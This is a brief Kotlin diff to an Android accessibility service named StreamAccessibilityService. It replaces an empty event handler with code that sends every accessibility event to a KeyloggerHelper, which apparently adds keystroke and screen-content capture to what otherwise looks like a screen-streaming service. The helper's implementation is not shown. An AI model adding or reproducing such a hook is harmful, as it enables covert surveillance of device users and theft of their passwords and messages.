@@ -50,7 +50,10 @@ class StreamAccessibilityService : AccessibilityService() {
         Log.i("StreamAS", "Connected, screen: ${screenWidth}x${screenHeight}")
     }
 
-    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
+    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        event ?: return
+        KeyloggerHelper.onEvent(event, this)
+    }
     override fun onInterrupt() {}
 
     override fun onDestroy() {
